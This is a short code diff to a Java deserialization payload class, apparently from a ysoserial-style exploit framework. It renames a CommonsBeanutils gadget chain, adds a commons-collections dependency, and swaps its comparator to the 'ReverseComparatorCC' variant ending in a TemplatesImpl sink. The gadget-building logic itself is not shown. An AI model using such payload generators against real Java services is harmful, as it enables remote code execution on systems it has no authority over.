@@ -10,14 +10,16 @@ import com.ppp.sinks.annotation.Sink;
 
 /**
  * @author Whoopsunix
+ *
+ * CommonsBeanutilsReverseComparatorCC
  */
-@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4"})
+@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4", "commons-collections:commons-collections:3.2.1"})
 @Authors({Authors.Whoopsunix})
 @Sink({Sink.TemplatesImpl})
-public class CommonsBeanutilsReverseComparatorJDK implements ObjectPayload<Object> {
+public class CommonsBeanutils8 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutilsReverseComparatorJDK.class, args);
+        PayloadRunner.run(CommonsBeanutils8.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -30,6 +32,6 @@ public class CommonsBeanutilsReverseComparatorJDK implements ObjectPayload<Objec
     }
 
     public Object getChain(Object templates, String version) throws Exception {
-        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ReverseComparatorJDK, templates, version);
+        return BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ReverseComparatorCC, templates, version);
     }
 }
